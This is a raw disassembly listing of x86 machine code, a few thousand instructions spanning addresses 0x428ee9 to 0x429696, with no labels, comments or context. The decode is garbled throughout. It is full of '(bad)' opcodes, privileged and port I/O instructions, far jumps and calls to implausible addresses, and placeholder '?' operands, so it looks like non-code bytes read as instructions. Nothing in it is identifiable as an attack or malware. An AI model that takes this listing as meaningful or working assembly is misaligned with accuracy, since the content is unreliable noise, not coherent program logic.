  428ee9:	dec    ebp
  428eea:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428ef0:	enter  0x12de,0xdf
  428ef4:	inc    ebp
  428ef5:	pop    ebp
  428ef6:	dec    DWORD PTR [ebx-0x257f0ff4]
  428efc:	add    DWORD PTR [edx],edx
  428efe:	add    BYTE PTR [ebp+0x50],dl
  428f01:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428f07:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428f0d:	or     ah,al
  428f0f:	pop    ss
  428f10:	cdq    
  428f11:	push   ebp
  428f12:	clc    
  428f13:	mov    eax,DWORD PTR [ebp-0x4]
  428f16:	xor    edx,edx
  428f18:	add    esi,DWORD PTR [ebx]
  428f1a:	cmp    eax,DWORD PTR [ebx]
  428f1c:	hlt    
  428f1d:	cmp    DWORD PTR [ebx],esp
  428f1f:	or     al,BYTE PTR [ebp+0xf]
  428f22:	mov    eax,DWORD PTR [edx]
  428f24:	loopne 0x428f26
  428f26:	(bad)  
  428f27:	mov    ecx,esi
  428f29:	cld    
  428f2a:	pushf  
  428f2b:	pop    ebp
  428f2c:	cwde   
  428f2d:	mov    esi,DWORD PTR [edx]
  428f2f:	lock mov eax,eax
  428f32:	adc    BYTE PTR [ebx],al
  428f34:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428f3b:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428f41:	dec    ebp
  428f42:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428f48:	(bad)  
  428f49:	iret   
  428f4a:	inc    ebp
  428f4b:	(bad)  
  428f4c:	jne    0x428f9b
  428f4e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428f54:	(bad)  
  428f55:	cmp    ebx,eax
  428f57:	je     0x428edf
  428f59:	add    edi,edi
  428f5b:	or     bh,bh
  428f5d:	dec    ebp
  428f5e:	inc    ebp
  428f5f:	mov    esi,DWORD PTR [ebx]
  428f61:	cld    
  428f62:	add    ecx,esi
  428f64:	cmp    ecx,DWORD PTR [eax-0xc]
  428f67:	mov    edx,DWORD PTR [edi]
  428f69:	or     BYTE PTR [ebp-0x7c],al
  428f6c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428f72:	test   BYTE PTR [eax+ebx*4],cl
  428f75:	inc    ebp
  428f76:	xor    bh,BYTE PTR ds:0x8be89c89
  428f7c:	out    dx,eax
  428f7d:	adc    BYTE PTR [eax],al
  428f7f:	jne    0x428f48
  428f81:	mov    ebp,esp
  428f83:	fcomp  DWORD PTR [ebx]
  428f85:	add    BYTE PTR [ecx],al
  428f87:	inc    DWORD PTR [ebp-0x75]
  428f8a:	mov    ?,esp
  428f8c:	add    al,0xce
  428f8e:	mov    ecx,edi
  428f90:	cld    
  428f91:	inc    ebp
  428f92:	fidivr WORD PTR [ebx]
  428f94:	fbstp  TBYTE PTR [ebp-0x3e]
  428f97:	mov    eax,DWORD PTR [eax]
  428f99:	adc    BYTE PTR [ebx-0x3974038b],cl
  428f9f:	fadd   st,st(7)
  428fa1:	add    BYTE PTR [ebp-0x1],al
  428fa4:	mov    ecx,DWORD PTR [esp+edi*8]
  428fa7:	inc    ebp
  428fa8:	mov    bh,0xc7
  428fab:	loopne 0x428ff2
  428fad:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428fb3:	add    DWORD PTR [ebx],esi
  428fb5:	pushf  
  428fb6:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428fbc:	mov    eax,edi
  428fbe:	cwde   
  428fbf:	inc    ebp
  428fc0:	inc    ebp
  428fc1:	jne    0x428f4e
  428fc3:	mov    esp,esp
  428fc5:	clc    
  428fc6:	add    al,0x4d
  428fc8:	mov    DWORD PTR [ebx],esi
  428fca:	or     al,0x33
  428fcc:	inc    ebp
  428fcd:	lea    ecx,[ebx-0x398d13fd]
  428fd3:	add    bh,al
  428fd5:	inc    ebp
  428fd6:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428fdd:	add    ebp,esp
  428fdf:	shufps xmm1,xmm3,0xc7
  428fe3:	(bad)  
  428fe4:	jmp    0x7487cb0d
  428fe9:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428fef:	hlt    
  428ff0:	mov    ecx,DWORD PTR [edi]
  428ff2:	fadd   DWORD PTR [ebp+0x0]
  428ff5:	xor    ecx,DWORD PTR [edi]
  428ff7:	add    ecx,ecx
  428ff9:	cmp    edi,edi
  428ffb:	pmuludq mm7,QWORD PTR [edx+0x50]
  428fff:	(bad)  
  429000:	jmp    0x428f8d
  429002:	mov    edi,esp
  429004:	or     al,0xc6
  429006:	inc    ebp
  429007:	(bad)  
  429008:	mov    eax,DWORD PTR [ebp+0x10]
  42900b:	jne    0x428f96
  42900d:	mov    eax,DWORD PTR [ecx]
  42900f:	clc    
  429010:	add    BYTE PTR [ebp-0x40],cl
  429013:	xor    edx,DWORD PTR [eax-0x73]
  429016:	jne    0x429019
  429018:	push   DWORD PTR [edx+0x8]
  42901b:	add    BYTE PTR [ebp+0x45],al
  42901e:	mov    ebp,ecx
  429020:	cld    
  429021:	add    BYTE PTR [ebp+0x0],cl
  429024:	xor    eax,DWORD PTR [ebp+0x3]
  429027:	mov    al,0x3b
  429029:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42902f:	sub    eax,0x5d330e4d
  429034:	lea    esi,[ebx]
  429036:	add    DWORD PTR [ebx],eax
  429038:	jb     0x429023
  42903a:	add    BYTE PTR [eax],al
  42903c:	inc    ebp
  42903d:	add    bl,ch
  42903f:	inc    ebp
  429040:	mov    esi,DWORD PTR [ebx]
  429042:	or     al,0x3
  429044:	(bad)  
  429045:	mov    edi,eax
  429047:	in     al,dx
  429048:	scas   eax,DWORD PTR es:[edi]
  429049:	inc    ebp
  42904a:	mov    esi,DWORD PTR [ebx]
  42904c:	in     al,0x3
  42904e:	add    al,0x89
  429050:	mov    ecx,DWORD PTR [eax+edi*8]
  429053:	dec    ebp
  429054:	(bad)  
  429055:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  42905c:	mov    ecx,eax
  42905e:	cld    
  42905f:	push   es
  429060:	dec    ebp
  429061:	add    al,0x33
  429063:	mov    DWORD PTR [ebx],eax
  429065:	in     al,dx
  429066:	cmp    DWORD PTR [ebp-0x67],eax
  429069:	mov    eax,DWORD PTR [ebp-0xba0068]
  42906f:	mov    edx,DWORD PTR [ebp-0x4]
  429072:	mov    ecx,DWORD PTR [ebp-0x18]
  429075:	xor    ecx,DWORD PTR [ebp+0x3]
  429078:	cmp    DWORD PTR [ebx],0x8b327497
  42907e:	xor    edi,esp
  429080:	jmp    0xff768dd2
  429085:	add    ecx,DWORD PTR [ebp-0x3f]
  429088:	xor    ebx,DWORD PTR [edi]
  42908a:	add    eax,ecx
  42908c:	cmp    ebx,DWORD PTR [eax]
  42908e:	mov    ecx,DWORD PTR [ebp-0x4]
  429091:	mov    ecx,DWORD PTR [eax]
  429093:	adc    BYTE PTR [ebp-0x80],al
  429096:	jmp    0x429099
  429098:	mov    eax,DWORD PTR [eax]
  42909a:	cld    
  42909b:	mov    bh,0xc6
  42909d:	push   ecx
  42909e:	(bad)  
  42909f:	jne    0x4290ff
  4290a1:	dec    ecx
  4290a3:	or     BYTE PTR [ecx+ebx*1],cl
  4290a6:	push   ebp
  4290a7:	inc    ebp
  4290a8:	in     al,dx
  4290a9:	add    ebp,esp
  4290ab:	or     bh,al
  4290ad:	dec    ebp
  4290ae:	cld    
  4290af:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  4290b5:	cmp    DWORD PTR [ecx],0x2
  4290b8:	pushf  
  4290b9:	dec    DWORD PTR [ebx+0x45510cf4]
  4290bf:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  4290c5:	mov    edx,DWORD PTR [ecx+0xc]
  4290c8:	xor    eax,esi
  4290ca:	mov    edx,0xc172c7
  4290cf:	inc    ebp
  4290d0:	mov    esi,DWORD PTR [ebp+0x8]
  4290d3:	mov    eax,edx
  4290d5:	call   0x84c757ca
  4290da:	add    DWORD PTR [eax-0x76bace00],ebx
  4290e0:	mov    ebp,eax
  4290e2:	or     BYTE PTR [eax],dl
  4290e4:	jo     0x429133
  4290e6:	push   edi
  4290e7:	xor    esi,DWORD PTR [ebp+0x3]
  4290ea:	(bad)  
  4290eb:	pmulhuw mm0,mm1
  4290ee:	test   DWORD PTR [ebp-0x8],ecx
  4290f1:	mov    DWORD PTR [ebp-0x67],eax
  4290f4:	mov    eax,DWORD PTR [ebp-0x4]
  4290f7:	xor    edi,DWORD PTR [ebp-0x73]
  4290fa:	xor    eax,DWORD PTR [ebx]
  4290fc:	xor    esi,DWORD PTR [edx+0x3]
  4290ff:	add    BYTE PTR [ecx],bh
  429101:	inc    ebp
  429102:	(bad)  
  429103:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  429109:	mov    DWORD PTR [eax],0x750f0004
  42910f:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  429115:	lock add BYTE PTR [ebp+0x0],al
  429119:	mov    esi,DWORD PTR [ebp-0x2c]
  42911c:	mov    ebp,edx
  42911e:	or     al,0x72
  429120:	ja     0x429122
  429122:	mov    edx,esi
  429124:	cld    
  429125:	(bad)  
  429128:	cli    
  429129:	mov    esi,DWORD PTR [ebp-0x4]
  42912c:	cmp    ecx,esi
  42912e:	bswap  edi
  429130:	(bad)
  429134:	mov    esi,DWORD PTR [ebp-0x4]
  429137:	mov    esi,ecx
  429139:	clc    
  42913a:	repnz add esi,DWORD PTR [ebp+0x45]
  42913e:	push   ebx
  42913f:	xor    eax,DWORD PTR [ebp+0x3]
  429142:	cmp    ebx,DWORD PTR [edi-0x64]
  429145:	pop    ebx
  429146:	jmp    0x42920d
  42914b:	mov    esi,DWORD PTR [ebp-0x7d]
  42914e:	xor    ebp,DWORD PTR [eax]
  429150:	lea    eax,[ebp-0x8]
  429153:	cmp    dl,dh
  429155:	pushf  
  429156:	out    dx,eax
  429157:	(bad)  
  429158:	neg    eax
  42915a:	ins    DWORD PTR es:[edi],dx
  42915b:	test   esi,edi
  42915d:	clc    
  42915e:	pop    esp
  42915f:	inc    ebp
  429160:	or     BYTE PTR [ecx+0x450f0c7d],cl
  429166:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42916c:	add    cl,al
  42916e:	jne    0x429108
  429170:	mov    esi,DWORD PTR [edx]
  429172:	in     al,dx
  429173:	push   esi
  429174:	xor    BYTE PTR [ebp-0xe],dh
  429177:	add    edi,esi
  429179:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42917f:	add    cl,bh
  429181:	mov    edi,DWORD PTR [ebp+0x8]
  429184:	mov    DWORD PTR [ebp-0x14],esi
  429187:	add    esi,DWORD PTR [ebp+0x3c]
  42918a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  429190:	mov    ah,0x3d
  429192:	cwde   
  429193:	pushf  
  429194:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42919a:	jne    0x429127
  42919c:	mov    ecx,DWORD PTR [esp+ebp*8]
  42919f:	icebp  
  4291a0:	icebp  
  4291a1:	shl    edx,0xf2
  4291a4:	(bad)  
  4291a5:	mov    ah,0x16
  4291a7:	cmp    BYTE PTR [ebp-0x6d],dh
  4291aa:	mov    ecx,DWORD PTR [edi]
  4291ac:	in     al,dx
  4291ad:	jmp    0x4291a0
  4291af:	add    dl,dh
  4291b1:	mov    edi,esi
  4291b3:	or     al,0x8
  4291b5:	inc    ebp
  4291b6:	jne    0x4291bb
  4291b8:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  4291be:	ret    
  4291bf:	or     bh,bh
  4291c1:	jge    0x4291ab
  4291c3:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  4291c9:	xor    edi,eax
  4291cb:	add    esi,DWORD PTR [ebp-0x77]
  4291ce:	mov    ebx,esp
  4291d0:	clc    
  4291d1:	neg    DWORD PTR [ebp-0x7c]
  4291d4:	xor    eax,DWORD PTR [eax]
  4291d6:	cmp    eax,DWORD PTR [eax]
  4291d8:	repz jne 0x429170
  4291db:	xor    eax,DWORD PTR [ecx]
  4291dd:	add    ebx,DWORD PTR [eax]
  4291df:	mov    DWORD PTR [ebp-0x8],eax
  4291e2:	mov    eax,edi
  4291e4:	cld    
  4291e5:	lock pop eax
  4291e7:	test   DWORD PTR [ebx],esi
  4291e9:	clc    
  4291ea:	add    edx,DWORD PTR [edi-0x740bff77]
  4291f0:	fdivp  st(4),st
  4291f2:	test   ecx,esi
  4291f4:	(bad)  
  4291f5:	jnp    0x4291f6
  4291f7:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4291fd:	jae    0x42918a
  4291ff:	sub    edi,esp
  429201:	(bad)  
  429202:	shl    DWORD PTR [eax-0x3e],0x89
  429206:	leave  
  429207:	call   0x81984914
  42920c:	in     al,dx
  42920d:	(bad)  
  42920e:	in     al,dx
  42920f:	add    bh,al
  429211:	mov    esp,edi
  429213:	in     al,dx
  429214:	test   DWORD PTR [ebp-0x8],edi
  429217:	mov    eax,DWORD PTR [ebp+0x2b]
  42921a:	cmp    DWORD PTR [ebx],eax
  42921c:	pushf  
  42921d:	jnp    0x57318e56
  429223:	xor    edx,DWORD PTR [eax-0x77]
  429226:	push   ecx
  429227:	loopne 0x42925c
  429229:	jne    0x4291e6
  42922b:	mov    esi,DWORD PTR [edx-0x20]
  42922e:	add    BYTE PTR [ebp-0x3d],bh
  429231:	xor    eax,DWORD PTR [ebp-0x73]
  429234:	mov    edi,DWORD PTR [esi]
  429236:	cld    
  429237:	jb     0x4291ff
  429239:	add    bl,al
  42923b:	jne    0x429282
  42923d:	mov    edx,DWORD PTR [edi-0x10]
  429240:	jge    0x4292bf
  429242:	mov    esi,DWORD PTR [ebx]
  429244:	lock add ecx,DWORD PTR [ebp+0x3b]
  429248:	xor    esi,DWORD PTR [ebp-0x77]
  42924b:	mov    esi,eax
  42924d:	lock inc ebp
  42924f:	jge    0x429289
  429251:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  429258:	dec    ebp
  429259:	mov    esi,DWORD PTR [ebx]
  42925b:	loopne 0x4291e6
  42925d:	jge    0x429257
  42925f:	add    DWORD PTR [ebp-0x7d],eax
  429262:	clc    
  429263:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42926a:	dec    ebp
  42926b:	hlt    
  42926c:	xor    ebx,DWORD PTR [ebp-0x77]
  42926f:	mov    esi,esp
  429271:	in     al,0x45
  429273:	jge    0x4292b1
  429275:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42927c:	dec    ebp
  42927d:	cmp    al,0x33
  42927f:	xchg   ebx,eax
  429280:	mov    DWORD PTR [ebx-0x14],esi
  429283:	add    eax,DWORD PTR [ebp-0xc]
  429286:	cmp    BYTE PTR [ebp-0x61],dh
  429289:	mov    edi,DWORD PTR [eax+0xf19504]
  42928f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429293:	cmp    eax,DWORD PTR [ebp+0xf]
  429296:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42929a:	fistp  WORD PTR [ebx+0x0]
  42929d:	inc    ebp
  42929e:	mov    ebx,DWORD PTR [edi+0xc]
  4292a1:	add    eax,eax
  4292a3:	inc    ebp
  4292a4:	test   BYTE PTR [ebx],dh
  4292a6:	add    eax,DWORD PTR [ebx]
  4292a8:	add    BYTE PTR [esi+0x45],bl
  4292ab:	ret    0x85
  4292ae:	jnp    0x5443167d
  4292b4:	inc    bp
  4292b6:	inc    ebp
  4292b7:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  4292bd:	fdiv   QWORD PTR [ebx]
  4292bf:	test   DWORD PTR [ecx+0x453af8],edi
  4292c5:	push   ebx
  4292c6:	add    edi,DWORD PTR [esi+0x708088b]
  4292cc:	cmp    esi,eax
  4292ce:	sets   BYTE PTR [ecx-0x74fcffce]
  4292d5:	mov    esp,edi
  4292d7:	call   0x33cdd829
  4292dc:	or     BYTE PTR [ebx],al
  4292de:	inc    ecx
  4292df:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4292e5:	and    BYTE PTR [ebp-0x7074f0bb],al
  4292eb:	lock add cl,al
  4292ee:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4292f5:	mov    ch,0x45
  4292f7:	clc    
  4292f8:	xor    eax,DWORD PTR [ebp+0x3]
  4292fb:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  429301:	inc    ebp
  429302:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  429308:	mov    edi,eax
  42930a:	mov    eax,DWORD PTR [ebp+0x3c]
  42930d:	mov    ecx,DWORD PTR [eax]
  42930f:	hlt    
  429310:	inc    ebp
  429311:	ror    DWORD PTR [ebx+0x818c45],0xf4
  429318:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42931e:	push   ebp
  42931f:	mov    edi,DWORD PTR [ebx]
  429321:	in     al,dx
  429322:	jne    0x4292e5
  429324:	mov    eax,DWORD PTR [ebp-0x28]
  429327:	add    DWORD PTR [eax],0xe8058dec
  42932d:	clc    
  42932e:	mov    esp,DWORD PTR [edi-0x8]
  429331:	add    dh,dl
  429333:	rol    WORD PTR [ebp-0x1],cl
  429337:	mov    edx,DWORD PTR [eax+0x8]
  42933a:	jne    0x4292fc
  42933c:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  429343:	inc    ebp
  429344:	push   esp
  429345:	test   DWORD PTR [ecx+0xf],ecx
  429348:	sub    edx,esp
  42934a:	add    eax,DWORD PTR [eax]
  42934c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  429352:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  429359:	mov    eax,DWORD PTR [ecx]
  42935b:	and    BYTE PTR [eax],al
  42935d:	adc    BYTE PTR ss:[eax],al
  429360:	inc    ebp
  429361:	inc    cx
  429364:	push   esp
  429365:	cld    
  429366:	jne    0x429368
  429368:	push   edx
  429369:	enterw 0xc1,0x4d
  42936e:	mov    esp,DWORD PTR [esi+0x20]
  429371:	add    DWORD PTR [ecx-0x7b],eax
  429374:	add    eax,DWORD PTR [ebx]
  429376:	str    WORD PTR [eax+0x45]
  42937a:	lea    ecx,[ebx+0x45890801]
  429380:	sbb    BYTE PTR [ebx],al
  429382:	dec    ebp
  429383:	cmp    al,0xf
  429385:	inc    ebp
  429386:	push   eax
  429387:	mov    esi,DWORD PTR [ebx]
  429389:	push   eax
  42938a:	add    eax,eax
  42938c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429393:	inc    ebp
  429394:	add    BYTE PTR [eax],bh
  429396:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42939d:	(bad)  
  42939e:	mov    ebx,eax
  4293a0:	loopne 0x4293e7
  4293a2:	dec    ebp
  4293a3:	mov    ecx,DWORD PTR [edi]
  4293a5:	cld    
  4293a6:	push   eax
  4293a7:	xchg   DWORD PTR [ebx],esi
  4293a9:	add    DWORD PTR [ebx],ebp
  4293ab:	add    BYTE PTR [ebx],ch
  4293ad:	or     BYTE PTR [ecx],bh
  4293af:	dec    ecx
  4293b0:	loopne 0x4293b5
  4293b2:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4293b8:	push   ebp
  4293b9:	add    DWORD PTR [ebx+0x55100800],eax
  4293bf:	dec    ebp
  4293c0:	jmp    0x42934b
  4293c2:	mov    esp,DWORD PTR [eax]
  4293c4:	sbb    dl,dl
  4293c6:	inc    eax
  4293c7:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  4293cd:	add    BYTE PTR [ebx+0x74528555],cl
  4293d3:	push   ebp
  4293d4:	div    DWORD PTR [ebx]
  4293d6:	and    eax,DWORD PTR [ebx]
  4293d8:	add    edx,DWORD PTR [edx-0x30]
  4293db:	jno    0x429368
  4293dd:	inc    DWORD PTR [eax+eiz*1]
  4293e0:	inc    ebp
  4293e1:	push   eax
  4293e2:	push   eax
  4293e3:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4293e9:	mov    edi,esp
  4293eb:	push   eax
  4293ec:	inc    ebp
  4293ed:	enter  0x458b,0x8
  4293f1:	push   ecx
  4293f2:	(bad)  
  4293f3:	call   0x10c9dcb
  4293f8:	pop    ss
  4293f9:	push   ebp
  4293fa:	mov    ecx,DWORD PTR [ebx+0x489408]
  429400:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  429406:	push   ecx
  429407:	jo     0x4293f1
  429409:	inc    DWORD PTR [edi]
  42940b:	or     BYTE PTR [eax],al
  42940d:	call   0xcd9b57
  429412:	fmul   QWORD PTR [ebp+0x55]
  429415:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42941b:	mov    bh,0x8c
  42941d:	adc    al,0x98
  42941f:	dec    esp
  429420:	xor    bl,BYTE PTR [eax]
  429422:	mov    ecx,DWORD PTR [ebp+0xc]
  429425:	mov    eax,DWORD PTR [ebp-0x4]
  429428:	mov    esi,DWORD PTR [edi-0x3148f924]
  42942e:	push   es
  42942f:	retf   
  429430:	mov    BYTE PTR [ebp-0x30],0x3b
  429434:	inc    ebp
  429435:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42943c:	retf   0x83fc
  42943f:	into   
  429440:	dec    ebp
  429441:	retf   
  429442:	mov    ecx,DWORD PTR [ebp-0x74]
  429445:	mov    eax,DWORD PTR [eax]
  429447:	fdiv   QWORD PTR [ebx]
  429449:	mov    bh,0x3
  42944b:	push   es
  42944c:	mov    esi,ecx
  42944e:	sbb    cl,dl
  429450:	dec    ebp
  429451:	sar    DWORD PTR [ebx],cl
  429453:	push   ebp
  429454:	jne    0x429465
  429456:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42945c:	lea    ebx,[eax]
  42945e:	call   0xf4cc2025
  429463:	sbb    dh,dl
  429465:	add    edx,ebx
  429467:	push   ebp
  429468:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42946e:	push   ecx
  42946f:	mov    DWORD PTR [eax-0x30],edx
  429472:	test   DWORD PTR [edx],eax
  429474:	xadd   esp,esi
  429477:	pop    es
  429478:	add    cl,dl
  42947a:	mov    eax,ecx
  42947c:	or     al,0x45
  42947e:	(bad)  
  42947f:	push   eax
  429480:	add    DWORD PTR [edx+0x0],eax
  429483:	add    ecx,DWORD PTR [ecx]
  429485:	and    dh,cl
  429487:	call   0xc69d57
  42948c:	add    DWORD PTR [ebp+0x0],edx
  42948f:	mov    esp,DWORD PTR [ebp+0x18]
  429492:	add    BYTE PTR [eax+0x44],cl
  429495:	xor    eax,DWORD PTR [eax]
  429497:	add    esp,DWORD PTR [esi+0x3b]
  42949a:	inc    ebp
  42949b:	je     0x429420
  42949d:	push   ecx
  42949e:	or     cl,BYTE PTR [ebp-0x77]
  4294a1:	add    eax,esi
  4294a3:	or     al,0x5e
  4294a5:	inc    eax
  4294a6:	add    BYTE PTR [ebx],al
  4294a8:	data16 and BYTE PTR [ebp+0x50],al
  4294ac:	sub    DWORD PTR [ecx],0xffffffe8
  4294af:	add    BYTE PTR [ebp-0x75],ah
  4294b2:	add    BYTE PTR [eax],bl
  4294b4:	enter  0x894d,0x8b
  4294b8:	int3   
  4294b9:	loopne 0x4294ed
  4294bb:	rol    BYTE PTR [eax],0x33
  4294be:	lea    cx,[ebp+0xa]
  4294c2:	data16 jb 0x42950a
  4294c5:	add    BYTE PTR [ebx+0x44890855],cl
  4294cb:	sbb    ah,al
  4294cd:	inc    ebp
  4294ce:	lldt   WORD PTR ss:[edx+0x66]
  4294d3:	xor    ecx,DWORD PTR [eax]
  4294d5:	sub    edi,esp
  4294d7:	mov    eax,DWORD PTR [eax]
  4294d9:	or     al,0x66
  4294db:	ror    edx,cl
  4294dd:	dec    ebp
  4294de:	inc    ebp
  4294df:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4294e5:	cld    
  4294e6:	or     BYTE PTR [edi+0x4501dd],dl
  4294ec:	(bad)  
  4294ed:	into   
  4294ee:	out    dx,al
  4294ef:	retf   
  4294f0:	(bad)  
  4294f1:	dec    ebp
  4294f2:	mov    al,0x8b
  4294f4:	jmp    0xea27:0x450ac320
  4294fb:	xchg   esi,ebp
  4294fd:	add    edi,eax
  4294ff:	add    BYTE PTR [eax+0x3f52e955],bh
  429505:	push   ebp
  429506:	inc    ebp
  429507:	xor    ebx,esp
  429509:	add    ebp,esi
  42950b:	push   edx
  42950c:	push   bp
  42950e:	inc    ebp
  42950f:	(bad)  
  429510:	in     eax,dx
  429511:	push   esp
  429512:	(bad)  
  429513:	inc    edx
  429515:	sbb    al,0x33
  429517:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42951e:	add    BYTE PTR [ebp+0x43],0x8b
  429522:	jmp    0xf98b:0x100041c8
  429529:	xor    esi,DWORD PTR [edx+0x3]
  42952c:	mov    ecx,DWORD PTR [edi]
  42952e:	fmul   DWORD PTR [edx]
  429530:	add    BYTE PTR [eax],al
  429532:	lea    eax,[ebx-0x4700273c]
  429538:	add    al,0x4f
  42953a:	pop    DWORD PTR [eax]
  42953c:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  429542:	push   edx
  429543:	inc    WORD PTR [ebp+0x8]
  429547:	mov    eax,0x514f4d
  42954c:	(bad)
  429550:	add    al,al
  429552:	xor    DWORD PTR [ebx-0x74baf730],eax
  429558:	test   DWORD PTR [esi+0x74],esp
  42955b:	inc    ebp
  42955c:	mov    DWORD PTR [eax+0xa4f08],edi
  429562:	add    BYTE PTR [ecx-0x76c435bb],cl
  429568:	or     dh,cl
  42956a:	or     eax,0x8b8d5045
  42956f:	inc    ebp
  429570:	mov    WORD PTR [ecx+0x3b8a00],?
  429576:	jne    0x4295ab
  429578:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42957e:	add    DWORD PTR [ebx],eax
  429580:	add    bh,bh
  429582:	adc    DWORD PTR [eax],ecx
  429584:	adc    DWORD PTR [ebp+0x55],edi
  429587:	push   es
  429588:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42958e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429595:	inc    ebp
  429596:	mov    esp,edi
  429598:	or     al,0xdc
  42959a:	push   eax
  42959b:	(bad)  
  42959c:	jne    0x429552
  42959e:	call   0x3a8e8f
  4295a3:	inc    ebp
  4295a4:	rol    dl,0x84
  4295a7:	out    dx,al
  4295a8:	add    bh,al
  4295aa:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  4295b1:	(bad)  
  4295b2:	and    al,al
  4295b4:	fs in  eax,dx
  4295b6:	inc    DWORD PTR [ebp-0x7b]
  4295b9:	js     0x4295ca
  4295bb:	leave  
  4295bc:	scas   al,BYTE PTR es:[edi]
  4295bd:	inc    esp
  4295be:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4295c5:	or     BYTE PTR [ebx-0x97717c5],0x83
  4295cc:	call   DWORD PTR [edi]
  4295ce:	shr    ah,0x84
  4295d1:	xchg   DWORD PTR [eax],eax
  4295d3:	add    DWORD PTR [eax],eax
  4295d5:	add    bh,bh
  4295d7:	dec    ebp
  4295d8:	and    BYTE PTR [ecx-0x38],dl
  4295db:	push   eax
  4295dc:	dec    DWORD PTR [ebx+0xfd885]
  4295e2:	mov    BYTE PTR [ebp+0x508bac00],cl
  4295e8:	mov    WORD PTR [ecx+0x0],ss
  4295eb:	lea    ecx,[ebx+0x108b20d8]
  4295f1:	mov    WORD PTR [edx],ds
  4295f3:	add    BYTE PTR [edi+0xff01ff],al
  4295f9:	mov    ecx,DWORD PTR [ebp-0x28]
  4295fc:	push   ecx
  4295fd:	shl    BYTE PTR [ebp+0x3a],0x8b
  429601:	inc    ebp
  429602:	in     al,0xeb
  429604:	jno    0x429591
  429606:	push   edx
  429607:	mov    DWORD PTR [eax-0x28],edx
  42960a:	mov    eax,DWORD PTR [ebp+0x20]
  42960d:	je     0x429596
  42960f:	mov    eax,DWORD PTR [ecx]
  429611:	sbb    BYTE PTR [eax],al
  429613:	pop    DWORD PTR [eax]
  429615:	add    esi,eax
  429617:	add    bl,al
  429619:	adc    DWORD PTR [edi],esi
  42961b:	jmp    0x8bcde66d
  429620:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  429627:	jne    0x4295b4
  429629:	mov    ecx,DWORD PTR [eax]
  42962b:	in     al,0x75
  42962d:	pop    DWORD PTR [ecx+0x5001]
  429633:	push   edx
  429634:	inc    DWORD PTR [ebx]
  429636:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42963c:	add    BYTE PTR [edi+0x9],dl
  42963f:	call   DWORD PTR [esi]
  429641:	and    dl,al
  429643:	and    bh,bh
  429645:	inc    edi
  429647:	test   eax,edx
  429649:	sldt   ebx
  42964c:	cmp    DWORD PTR [eax],eax
  42964e:	pushf  
  42964f:	(bad)  
  429650:	jmp    0x42965e
  429652:	mov    eax,edi
  429654:	or     al,0x75
  429656:	inc    eax
  429657:	call   0x428d5f
  42965c:	mov    eax,eax
  42965e:	loopne 0x4295e4
  429660:	inc    ebp
  429661:	add    BYTE PTR [ebx+0x1451c00],cl
  429667:	mov    eax,DWORD PTR [ebp+0x20]
  42966a:	add    edi,ecx
  42966c:	add    BYTE PTR [eax],ch
  42966e:	cmp    edi,0x18
  429671:	test   DWORD PTR [ebp+0xf],esi
  429674:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42967b:	jne    0x42967f
  42967d:	call   0xffa19142
  429682:	leave  
  429683:	rcr    BYTE PTR [esp+eax*4],0x55
  429687:	add    ah,ch
  429689:	add    BYTE PTR [edi-0x48fef979],dh
  42968f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429696:	inc    esp
